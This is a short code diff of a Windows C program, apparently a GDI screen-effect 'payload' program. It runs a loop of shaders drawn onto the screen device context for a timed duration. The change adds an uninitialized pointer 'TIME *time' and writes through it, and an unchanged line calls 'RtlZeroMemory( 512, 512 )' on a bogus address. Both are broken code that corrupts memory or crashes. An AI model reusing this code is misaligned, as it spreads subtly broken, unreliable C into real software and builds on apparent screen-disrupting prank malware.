@@ -6,7 +6,7 @@ InitializeEsfera(
 	VOID
 )
 {
-	SeedXorshift32(6969696969696969);
+	SeedXorshift32( 6969696969696969 );
 	bSafe = FALSE;
 	bSkip = FALSE;
 	return TRUE;
@@ -26,10 +26,14 @@ wWinMain(
 	hInst = ( HINSTANCE )hInstance;
 	if ( !InitializeEsfera( ) )
 		return FALSE;
+
+	TIME *time;
+	time->sec = PAYLOAD_TIME;
+	
 	for ( INT i = 0; i < Shaders; i++ )
 	{
 		ExecuteShader( hdcScreen, hdcMem, !( Xorshift32( ) % 2 ) ? 1000 : 500, 
-			( PSHADER )&Esfera->Shaders[ i ], PAYLOAD_TIME );
+			( PSHADER )&Esfera->Shaders[ i ], &time->sec );
 	}
 	
 	RtlZeroMemory( 512, 512 );
